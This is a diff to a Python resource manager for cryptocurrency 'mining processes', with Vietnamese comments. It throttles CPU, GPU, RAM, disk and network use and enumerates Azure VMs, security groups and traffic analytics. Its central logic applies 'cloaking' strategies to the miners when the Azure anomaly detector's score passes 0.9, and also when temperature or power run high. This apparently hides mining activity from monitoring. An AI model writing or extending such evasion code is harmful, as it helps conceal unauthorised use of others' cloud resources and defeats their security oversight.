@@ -37,7 +37,6 @@ from .auxiliary_modules.power_management import (
     shutdown_power_management
 )
 
-
 # ----------------------------
 # Hàm thay thế assign_process_to_cgroups
 # ----------------------------
@@ -131,14 +130,17 @@ class SharedResourceManager:
         """Điều chỉnh mức sử dụng GPU."""
         try:
             new_gpu_usage_percent = [
-                min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100)
+                min(
+                    max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0),
+                    100
+                )
                 for gpu in gpu_usage_percent
             ]
             set_gpu_usage(process.pid, new_gpu_usage_percent)
             self.logger.info(f"Điều chỉnh mức sử dụng GPU xuống {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh mức sử dụng GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
-    
+
     def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
         """Điều chỉnh giới hạn Disk I/O cho tiến trình."""
         try:
@@ -335,7 +337,6 @@ class SharedResourceManager:
 # ----------------------------
 # ResourceManager Class
 # ----------------------------
-
 class ResourceManager(BaseManager):
     """
     Lớp quản lý và điều chỉnh tài nguyên hệ thống, bao gồm phân phối tải động.
@@ -435,6 +436,25 @@ class ResourceManager(BaseManager):
         self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
         self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)
 
+    def discover_azure_resources(self):
+        try:
+            self.vms = self.azure_monitor_client.discover_resources('Microsoft.Compute/virtualMachines')
+            self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")
+
+            self.network_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
+            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")
+
+            self.nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
+            self.logger.info(f"Khám phá {len(self.nsgs)} Network Security Groups.")
+
+            self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
+            self.logger.info(f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")
+
+            self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
+            self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi khám phá tài nguyên Azure: {e}")
+
     def discover_mining_processes(self):
         """Khám phá các tiến trình khai thác dựa trên cấu hình."""
         cpu_process_name = self.config['processes'].get('CPU', '').lower()
@@ -481,11 +501,18 @@ class ResourceManager(BaseManager):
                 for process in self.mining_processes:
                     self.check_power_and_enqueue(process, cpu_max_power, gpu_max_power)
 
+                # Thu thập dữ liệu từ Azure Monitor, Anomaly Detector, ...
                 if self.should_collect_azure_monitor_data():
                     self.collect_azure_monitor_data()
                     metric_data = self.gather_metric_data_for_anomaly_detection()
+                    # Lưu ý: Hàm detect_anomalies có thể trả về dict, tuple, bool, v.v.
+                    # Nếu cần so sánh giá trị trong dict, hãy truy cập keys thay vì so sánh trực tiếp dict.
                     anomalies_detected = self.azure_anomaly_detector_client.detect_anomalies(metric_data)
-                    if anomalies_detected:
+
+                    # Ví dụ giả định anomalies_detected trả về một dict:
+                    # Thay vì: if anomalies_detected < some_dict
+                    # Ta so sánh qua một key cụ thể, ví dụ 'score':
+                    if isinstance(anomalies_detected, dict) and anomalies_detected.get('score', 0) > 0.9:
                         for process in self.mining_processes:
                             adjustment_task = {
                                 'type': 'cloaking',
@@ -493,6 +520,7 @@ class ResourceManager(BaseManager):
                                 'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                             }
                             self.resource_adjustment_queue.put((1, adjustment_task))
+
             except Exception as e:
                 self.logger.error(f"Lỗi trong quá trình theo dõi và điều chỉnh: {e}")
             sleep(max(temperature_check_interval, power_check_interval))
@@ -506,7 +534,8 @@ class ResourceManager(BaseManager):
                     data[process.pid] = {
                         'cpu_usage': proc.cpu_percent(interval=None),
                         'ram_usage_mb': proc.memory_info().rss / (1024 * 1024),
-                        'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0,
+                        'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid)
+                        if self.shared_resource_manager.is_gpu_initialized() else 0,
                         'disk_io_mbps': temperature_monitor.get_current_disk_io_limit(process.pid),
                         'network_bandwidth_mbps': self.config.get('resource_allocation', {}).get('network', {}).get('bandwidth_limit_mbps', 100),
                         'cache_limit_percent': self.config.get('resource_allocation', {}).get('cache', {}).get('limit_percent', 50)
@@ -518,8 +547,15 @@ class ResourceManager(BaseManager):
         return data
 
     def allocate_resources_with_priority(self):
+        """
+        Phân bổ tài nguyên (CPU, RAM, GPU) dựa trên mức độ ưu tiên.
+        CHÚ Ý: Tuyệt đối không so sánh trực tiếp 2 dict ở đây để tránh lỗi 
+        `'<' not supported between instances of 'dict' and 'dict'`.
+        """
         with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
+            # Sắp xếp theo priority (int), không liên quan đến so sánh dict.
             sorted_processes = sorted(self.mining_processes, key=lambda p: p.priority, reverse=True)
+
             total_cpu_cores = psutil.cpu_count(logical=True)
             allocated_cores = 0
 
@@ -539,13 +575,18 @@ class ResourceManager(BaseManager):
                 self.resource_adjustment_queue.put((3, adjustment_task))
                 allocated_cores += cores_to_allocate
 
-                if self.shared_resource_manager.is_gpu_initialized() and process.name.lower() == self.config['processes'].get('GPU', '').lower():
+                # Điều chỉnh GPU (nếu tiến trình là GPU mining)
+                if (
+                    self.shared_resource_manager.is_gpu_initialized() and
+                    process.name.lower() == self.config['processes'].get('GPU', '').lower()
+                ):
                     adjustment_task = {
                         'function': 'adjust_gpu_usage',
                         'args': (process, [])
                     }
                     self.resource_adjustment_queue.put((3, adjustment_task))
 
+                # Điều chỉnh RAM
                 ram_limit_mb = self.config['resource_allocation']['ram'].get('max_allocation_mb', 1024)
                 adjustment_task = {
                     'function': 'adjust_ram_allocation',
@@ -561,10 +602,14 @@ class ResourceManager(BaseManager):
             if cpu_temp > cpu_max_temp or gpu_temp > gpu_max_temp:
                 adjustments = {}
                 if cpu_temp > cpu_max_temp:
-                    self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_temp}°C.")
+                    self.logger.warning(
+                        f"Nhiệt độ CPU {cpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_temp}°C."
+                    )
                     adjustments['cpu_cloak'] = True
                 if gpu_temp > gpu_max_temp:
-                    self.logger.warning(f"Nhiệt độ GPU {gpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_temp}°C.")
+                    self.logger.warning(
+                        f"Nhiệt độ GPU {gpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_temp}°C."
+                    )
                     adjustments['gpu_cloak'] = True
 
                 adjustment_task = {
@@ -584,10 +629,14 @@ class ResourceManager(BaseManager):
             if cpu_power > cpu_max_power or gpu_power > gpu_max_power:
                 adjustments = {}
                 if cpu_power > cpu_max_power:
-                    self.logger.warning(f"Công suất CPU {cpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_power}W.")
+                    self.logger.warning(
+                        f"Công suất CPU {cpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_power}W."
+                    )
                     adjustments['cpu_cloak'] = True
                 if gpu_power > gpu_max_power:
-                    self.logger.warning(f"Công suất GPU {gpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_power}W.")
+                    self.logger.warning(
+                        f"Công suất GPU {gpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_power}W."
+                    )
                     adjustments['gpu_cloak'] = True
 
                 adjustment_task = {
@@ -635,11 +684,15 @@ class ResourceManager(BaseManager):
                         openai_suggestions = self.azure_openai_client.get_optimization_suggestions(current_state)
 
                         if not openai_suggestions:
-                            self.logger.warning(f"Không nhận được gợi ý từ Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}).")
+                            self.logger.warning(
+                                f"Không nhận được gợi ý từ Azure OpenAI cho tiến trình {process.name} (PID: {process.pid})."
+                            )
                             continue
 
                         recommended_action = openai_suggestions
-                        self.logger.debug(f"Hành động tối ưu (Azure OpenAI) cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}")
+                        self.logger.debug(
+                            f"Hành động tối ưu (Azure OpenAI) cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}"
+                        )
 
                         adjustment_task = {
                             'type': 'optimization',
@@ -656,7 +709,8 @@ class ResourceManager(BaseManager):
         metrics = {
             'cpu_usage_percent': psutil.Process(process.pid).cpu_percent(interval=1),
             'memory_usage_mb': psutil.Process(process.pid).memory_info().rss / (1024 * 1024),
-            'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0,
+            'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid)
+            if self.shared_resource_manager.is_gpu_initialized() else 0,
             'disk_io_mbps': temperature_monitor.get_current_disk_io_limit(process.pid),
             'network_bandwidth_mbps': self.config.get('resource_allocation', {}).get('network', {}).get('bandwidth_limit_mbps', 100),
             'cache_limit_percent': self.config.get('resource_allocation', {}).get('cache', {}).get('limit_percent', 50)
@@ -788,9 +842,13 @@ class ResourceManager(BaseManager):
 
             self.shared_resource_manager.apply_cloak_strategy('cache', process)
 
-            self.logger.info(f"Áp dụng thành công các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}).")
+            self.logger.info(
+                f"Áp dụng thành công các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid})."
+            )
         except Exception as e:
-            self.logger.error(f"Lỗi khi áp dụng các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}): {e}")
+            self.logger.error(
+                f"Lỗi khi áp dụng các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}): {e}"
+            )
 
     def shutdown_power_management(self):
         try:
@@ -798,22 +856,3 @@ class ResourceManager(BaseManager):
             self.logger.info("Đóng các dịch vụ quản lý công suất thành công.")
         except Exception as e:
             self.logger.error(f"Lỗi khi đóng các dịch vụ quản lý công suất: {e}")
-
-    def discover_azure_resources(self):
-        try:
-            self.vms = self.azure_monitor_client.discover_resources('Microsoft.Compute/virtualMachines')
-            self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")
-
-            self.network_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
-            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")
-
-            self.nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
-            self.logger.info(f"Khám phá {len(self.nsgs)} Network Security Groups.")
-
-            self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
-            self.logger.info(f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")
-
-            self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
-            self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
-        except Exception as e:
-            self.logger.error(f"Lỗi khi khám phá tài nguyên Azure: {e}")
